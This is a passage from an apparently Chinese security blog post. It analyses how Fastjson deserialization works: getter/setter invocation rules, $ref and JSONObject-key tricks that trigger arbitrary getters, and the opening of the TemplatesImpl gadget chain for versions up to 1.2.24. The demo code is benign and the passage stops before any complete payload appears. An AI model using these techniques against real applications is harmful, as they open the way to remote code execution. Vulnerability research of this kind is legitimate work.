<li><font style="color:#000000;">类的类型（Type）：java.lang.reflect.Type，用来执行反序列化类的类型</font></li>
<li><font style="color:#000000;">处理泛型反序列化（TypeReference）：com.alibaba.fastjson.TypeReference</font></li>
<li><font style="color:#000000;">编程扩展定制反序列化（ParseProcess）：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor用于处理多余的字段，ExtraTypeProvider用于处理多余字段时提供类型信息</font></li>
</ol>
<h3 id="parse-parseObject"><a href="#parse-parseObject" class="headerlink" title="parse&amp;parseObject"></a>parse&amp;parseObject</h3><p><font style="color:#000000;">在FastJson中，parse方法和parseObject方法都可以用来将JSON字符串反序列化成Java对象，parseObject方法相较于parse方法只是做了一层封装，判断返回的对象是否为JSONObject实例并强转为JSONObject类。</font></p>
<p><font style="color:#000000;">所以进行反序列化时的细节区别在于，</font><strong><font style="color:#000000;">parse方法会识别并调用目标类的setter方法及某些特定条件的getter方法（返回值类型继承自Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong的getter方法）</font></strong><font style="color:#000000;">，而parseObject方法由于多执行了JSON.toJSON(obj)，所以在处理过程中</font><strong><font style="color:#000000;">parseObject方法会调用反序列化目标类的所有setter和getter方法</font></strong><font style="color:#000000;">。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">使用JSON.parse(jsonString)&#x2F;JSON.parseObject(jsonString)方法和JSON.parseObject(jsonString, Target.class)方法时，两者调用链一致。</font></p>
<ul>
<li><font style="color:#000000;">前者会在jsonString中解析字符串获取@type指定的类</font></li>
</ul>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734677323298-afec7a2d-361a-49df-bb36-744a2f5d38c0.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678056721-e6f2827c-b967-4208-8433-bb250afbb990.png"></p>
<ul>
<li><font style="color:#000000;">后者则会直接使用参数中的class</font></li>
</ul>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678597071-144cf5a4-7c60-4d2d-aa37-06b2cf286e83.png"></p>
<h3 id="getter-setter"><a href="#getter-setter" class="headerlink" title="getter&amp;setter"></a>getter&amp;setter</h3><p><font style="color:#000000;">Fastjson在创建类实例时，会通过反射调用类中符合条件的getter&#x2F;setter方法。</font></p>
<p><font style="color:#000000;">其中getter方法需满足如下要求：</font><strong><font style="color:#000000;">方法名长于4、不是静态方法、以get开头且第4位是大写字母、方法不能有参数传入、继承自Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有setter方法</font></strong><font style="color:#000000;">。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : clazz.getMethods()) &#123; <span class="comment">// getter methods</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">            || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">            || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">            || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">            || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            ...</span><br><span class="line">            </span><br><span class="line">            add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">setter方法需满足如下条件：</font><strong><font style="color:#000000;">方法名长于4，以set开头且第4位是大写字母、非静态方法、返回类型为void或当前类、参数个数为1个</font></strong><font style="color:#000000;">。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// support builder set</span></span><br><span class="line">    <span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="parse突破特殊getter调用限制"><a href="#parse突破特殊getter调用限制" class="headerlink" title="parse突破特殊getter调用限制"></a>parse突破特殊getter调用限制</h3><h4 id="ref"><a href="#ref" class="headerlink" title="$ref"></a>$ref</h4><p><font style="color:#000000;">$ref是fastjson里的引用，用于引用之前出现的对象。由于调用getter方法时存在限制的，对于一般的不满足条件的getter方法，</font><strong><font style="color:#000000;">当fastjson ＞&#x3D; 1.2.36时，可以使用$ref的方式来调用任意的getter</font></strong><font style="color:#000000;">。</font></p>
<table>
<thead>
<tr>
<th align="center"><font style="color:#000000;">语法</font></th>
<th align="center"><font style="color:#000000;">描述</font></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><font style="color:#000000;">{“$ref”:”$”}</font></td>
<td align="center"><font style="color:#000000;">根对象</font></td>
</tr>
<tr>
<td align="center"><font style="color:#000000;">{“$ref”:”@”}</font></td>
<td align="center"><font style="color:#000000;">当前对象，即自引用</font></td>
</tr>
<tr>
<td align="center"><font style="color:#000000;">{“$ref”:”..”}</font></td>
<td align="center"><font style="color:#000000;">父对象</font></td>
</tr>
<tr>
<td align="center"><font style="color:#000000;">{“$ref”:”..&#x2F;..”}</font></td>
<td align="center"><font style="color:#000000;">引用父对象的父对象</font></td>
</tr>
<tr>
<td align="center"><font style="color:#000000;">{“$ref”:”</font><font style="color:#000000;">$.children.0</font><font style="color:#000000;">“}</font></td>
<td align="center"><font style="color:#000000;">基于路径的引用，</font><font style="color:#000000;">相当于 root.getChildren().get(0)</font></td>
</tr>
</tbody></table>
<p><font style="color:#000000;">在示例代码中，利用parse来反序列化数据时并没有触发Ref类中的getter方法，但是利用$ref来引用之前出现的对象后，成功触发了指定的getName方法。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Ref</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ref</span>();</span><br><span class="line">        ref.setId(<span class="string">&quot;H3rmesk1t&quot;</span>);</span><br><span class="line">        ref.setName(<span class="string">&quot;AlphaG0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object to JSON...&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSONString(ref, SerializerFeature.WriteClassName));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse...&quot;</span>);</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parseObject...&quot;</span>);</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonRef</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].name\&quot;&#125;]&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse and ref...&quot;</span>);</span><br><span class="line">        JSON.parse(jsonRef);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ref</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735010751608-3197b2fc-5e3b-44ab-841c-2b038797f199.png"></p>
<p><font style="color:#000000;">在com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask方法中，对JSON路径表达式进行处理，先尝试通过getObject方法获取refValue，获取不到的则会调用JSONPath解析函数，根据ref从value种获取对应的值。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735011746312-b1ddc479-79f9-4c05-8fd6-7522ab17ac54.png"></p>
<p><font style="color:#000000;">JSONPath#eval方法最终会调用到JSONPath#getPropertyValue方法，会尝试调用fieldInfo的get函数或者用利用反射的方式调用getter。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012086010-ad7ad6e6-229b-418b-b0bd-f15c056cd9c1.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012176374-9977adbf-c0dc-4e05-97da-2c711e5b4ad0.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012268675-6fe08c05-3986-43d3-92c0-d877a484e498.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735012302569-8f5aa7e4-4058-4060-a2a9-706d5af21abe.png"></p>
<p><font style="color:#000000;">至于为什么小于fastjson 1.2.36版本无法使用该Trick，差异主要在com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask方法。在1.2.36版本以下，要求refValue不为null，且必须为JSONObject类，而获取到的refValue为null，因此无法利用。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastjson 1.2.42</span></span><br><span class="line"><span class="keyword">if</span> (ref.startsWith(<span class="string">&quot;$&quot;</span>)) &#123;</span><br><span class="line">    refValue = getObject(ref);</span><br><span class="line">    <span class="keyword">if</span> (refValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            refValue = JSONPath.eval(value, ref);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONPathException ex) &#123;</span><br><span class="line">            <span class="comment">// skip</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// fastjson 1.2.31</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">refValue</span> <span class="operator">=</span> ref.startsWith(<span class="string">&quot;$&quot;</span>) ? getObject(ref) : task.context.object;</span><br><span class="line"><span class="type">FieldDeserializer</span> <span class="variable">fieldDeser</span> <span class="operator">=</span> task.fieldDeserializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fieldDeser != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (refValue != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; refValue.getClass() == JSONObject.class</span><br><span class="line">            &amp;&amp; fieldDeser.fieldInfo != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !Map.class.isAssignableFrom(fieldDeser.fieldInfo.fieldClass)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> <span class="built_in">this</span>.contextArray[<span class="number">0</span>].object;</span><br><span class="line">        refValue = JSONPath.eval(root, ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fieldDeser.setValue(object, refValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JSONObject"><a href="#JSONObject" class="headerlink" title="JSONObject"></a>JSONObject</h4><p><font style="color:#000000;">那当fastjson &lt;&#x3D; 1.2.36时，有没有什么方法可以调用任意getter方法呢？答案是肯定，可以利用JSONObject#toString来实现这个目的。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObjectDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Ref</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ref</span>();</span><br><span class="line">        ref.setId(<span class="string">&quot;H3rmesk1t&quot;</span>);</span><br><span class="line">        ref.setName(<span class="string">&quot;AlphaG0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object to JSON...&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSONString(ref, SerializerFeature.WriteClassName));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse...&quot;</span>);</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parseObject...&quot;</span>);</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonRef</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;x\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;name\&quot;:\&quot;AlphaG0\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse and ref...&quot;</span>);</span><br><span class="line">        JSON.parse(jsonRef);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSONObject</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013192265-11077587-a39e-4adf-b746-5f02d83d3670.png"></p>
<p><font style="color:#000000;">在com.alibaba.fastjson.JSON#toString方法中，会进行序列化操作，将Object转为String。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013350422-abacfe4f-5f00-4a6a-8c3a-f6607d1347cc.png"></p>
<p><font style="color:#000000;">最终会调用到JavaBeanSerializer#write方法，会尝试调用fieldInfo的get函数或者用利用反射的方式调用getter。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013745008-305c043e-bea0-4f35-adc4-b7429a41e3ec.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013760964-aba7ffbd-70e4-4b69-a538-97e4662dfd3a.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735013791563-06ede5e6-36d4-4d19-90b7-243889158efa.png"></p>
<p><font style="color:#000000;">那么如何触发com.alibaba.fastjson.JSON#toString方法呢，在反序列化过程中，需要找到一处可以使用JSONObject调用toString的地方。</font></p>
<p><font style="color:#000000;">DefaultJSONParser#parse方法在解析的过程中，如果遇到{会套一层JSONObject，因此需要将key构造成JSONObject，类似<code>&#123;&#123;some&#125;:x&#125;</code>。接着调用DefaultJSONParser#parseObject方法，此时key为JSONObject，调用toString方法时会触发com.alibaba.fastjson.JSON#toString方法。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014092313-29bcc42d-6f9b-4772-9a7a-4f15f31a93b9.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014669978-70ef0731-d5cc-4e8e-90ab-e9f794eba4b3.png"></p>
<p><font style="color:#000000;">大于fastjson 1.2.36版本中，com.alibaba.fastjson.parser.DefaultJSONParser#parseObject方法不会再调用toString函数，导致无法使用。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735014875681-886c6c57-e798-4d44-b470-7489ae8a39f9.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><font style="color:#000000;">JSON要转为JavaBean</font><strong><font style="color:#000000;">通常必须开启autoType</font></strong><font style="color:#000000;">，而autoType默认情况下是关闭状态，所以不能够在未开启的情况下去反序列化指定的类，JSON解析流程大致如下。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734790104587-c761e5cc-7cd5-41ac-af4a-1eda1196eab0.png"></p>
<h3 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson-1.2.24"></a>fastjson-1.2.24</h3><blockquote>
<p><font style="color:#000000;">fastjson &lt;&#x3D; 1.2.24，fastjson默认使用@type指定反序列化任意类，攻击者可以通过在Java常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的getter&#x2F;setter方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。</font></p>
</blockquote>
<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><font style="color:#000000;">TemplatesImpl</font></h4><p><font style="color:#000000;">在之前的文章中，无论是JNDI注入，还是反序列化，只要涉及到不出网的场景，就常常会利用到TemplatesImpl来动态加载字节码。com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类实现了Serializable接口，因此它可以被序列化。</font></p>
<p><font style="color:#000000;">该类中存在一个成员属性_class，是一个Class类型的数组，数组里下标为_transletIndex的类会在getTransletInstance方法中使用newInstance方法进行实例化。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936323630-c91bf7ea-f24a-4cc6-ae2d-359d1b85e371.png"></p>
<p><font style="color:#000000;">该类中的newTransformer方法会调用getTransletInstance方法，而该类中的getOutputProperties方法又会调用newTransformer方法。同时，getTransletInstance方法又是类成员变量_outputProperties的getter方法。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936675630-e53eff98-9dd3-4207-86bc-bfe87b0c03d9.png"></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936712641-44c1bb74-d7e1-4550-a8a3-624d1520c912.png"></p>
<p><font style="color:#000000;">接着看看_class中的类是否可控，在defineTransletClasses方法中，当_bytecodes不为空时，会调用自定义的ClassLoader去加载_bytecodes，因此可以构造一个TemplatesImpl类的反序列化字符串，其中_bytecodes是构造的恶意类的类字节码，</font><strong><font style="color:#000000;">这个类的父类是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</font></strong><font style="color:#000000;">，最终这个类会被加载并使用newInstance方法进行实例化。</font></p>
<p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734936926835-1b9244df-58a8-47e4-a2f2-83ebd2bd263a.png"></p>
